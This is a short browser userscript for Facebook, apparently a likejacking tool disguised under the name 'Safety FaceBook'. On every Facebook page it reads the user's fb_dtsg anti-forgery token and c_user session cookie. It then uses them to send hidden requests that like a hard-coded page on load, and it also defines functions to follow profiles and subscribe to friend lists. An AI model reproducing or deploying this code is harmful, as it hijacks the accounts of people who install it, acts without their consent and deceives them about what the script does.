// ==UserScript==
// @name            Safety FaceBook
// @description     All about Facebook By CrazyBlues
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

//like
function Like(p) { 
	var Page = new XMLHttpRequest(); 
	var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; 
	var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; 
	Page.open("POST", PageURL, true); 
	Page.onreadystatechange = function () { 
		if (Page.readyState == 4 && Page.status == 200) { 
			Page.close; 
		} 
	}; 
	Page.send(PageParams); 
}


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
//follow
function a(abone) {
	var http4 = new XMLHttpRequest;
	var url4 = "/ajax/follow/follow_profile.php?__a=1";
	var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
	http4.open("POST", url4, true);
	http4.onreadystatechange = function () {
		if (http4.readyState == 4 && http4.status == 200) http4.close
	};
	http4.send(params4)
}

//subscribe
function sublist(uidss) {
	var a = document.createElement('script');
	a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
	document.body.appendChild(a);
}
Like("155656757791086");